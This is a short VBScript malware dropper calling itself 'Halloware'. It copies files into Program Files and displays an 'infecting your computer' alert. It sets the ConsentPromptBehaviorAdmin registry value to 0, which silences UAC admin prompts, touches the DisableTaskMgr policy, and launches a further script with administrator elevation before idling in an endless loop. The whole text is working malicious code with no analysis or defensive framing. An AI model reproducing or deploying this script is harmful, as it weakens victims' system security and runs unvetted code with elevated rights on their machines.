set x = createobject("Wscript.Shell")
set c = createobject("scripting.filesystemobject")
set objshell = createobject("Shell.Application")

'/////////////////////////////////////////////////////////////////
'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\



if c.FolderExists("C:\Program Files\Halloware") then
msgbox"Eh.. Access denied",1+16,"Error"
wscript.quit
else
c.CreateFolder"C:\Program Files\Halloware"
end if

wscript.sleep 1000

c.CopyFolder"fileler", "C:\Program Files\Halloware"
x.run "cmd.exe /c echo msgbox""Please wait while halloware infecting your computer"",1+48,""Alert"" > ""%temp%\waitdude.vbs"" & wscript.exe ""%temp%\waitdude.vbs""",0
x.RegWrite"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin","0","REG_DWORD"
x.RegWrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr","0","REG_DWORD"
wscript.sleep 2000
dim buhu : buhu="C:\Program files\halloware\takeact.vbs" 
 ObjShell.ShellExecute "wscript.exe", """" & buhu & """ RunAsAdministrator", , "runas", 1  
do
wscript.sleep 9000
loop










